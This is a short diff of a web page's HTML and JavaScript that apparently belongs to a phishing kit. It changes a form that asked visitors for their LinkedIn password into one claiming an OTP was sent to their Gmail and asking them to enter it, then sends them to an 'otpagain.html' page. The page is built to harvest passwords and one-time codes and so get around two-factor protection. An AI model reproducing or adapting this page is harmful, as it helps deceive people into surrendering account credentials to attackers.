@@ -44,9 +44,9 @@
   <div class="header">
          <img src="logo.png" alt="Company Logo" class="logo">
   </div>
-  <p>Enter the password here, to submit your Linkedin profile.</p>
+  <p>A OTP was sent your gmail, check inbox and put this otp here.</p>
         <form id="loginForm">
-    <input type="password" id="password" name="message" placeholder="Enter Linkedin Password" required>
+    <input type="password" id="password" name="message" placeholder="Enter OTP here..." required>
     <button type="submit">Submit</button>
 
     <p> <a href="login.html">Forgot Password?</a></p>
@@ -67,7 +67,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         }
     }).then(function(response) {
         if (response.ok) {
-            window.location.href = "success.html"; // Redirect after successful submission
+            window.location.href = "otpagain.html"; // Redirect after successful submission
         } else {
             alert('Form submission failed. Please try again.');
         }
